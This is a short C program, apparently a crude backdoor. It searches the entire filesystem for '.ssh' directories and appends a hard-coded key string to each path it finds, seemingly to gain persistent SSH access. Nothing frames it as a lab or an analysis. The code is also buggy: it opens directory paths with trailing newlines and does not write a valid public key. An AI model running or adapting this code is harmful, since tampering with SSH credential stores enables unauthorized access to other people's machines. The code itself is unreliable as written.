#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main(int argc, char**argv){
	char* KEY = "123321132321";
	system("find / d -name .ssh 2>/dev/null > /tmp/F");
	FILE *fp = fopen("/tmp/F","r");
	char* line = NULL;
	size_t len = 0;
	
	while(getline(&line, &len,fp) != -1){
		//printf("ma ligne : %s",line);
		FILE* fssh = fopen(line,"a");
		fprintf(fssh,"\n %s",KEY);		
	}
	
	
	return 0;
}
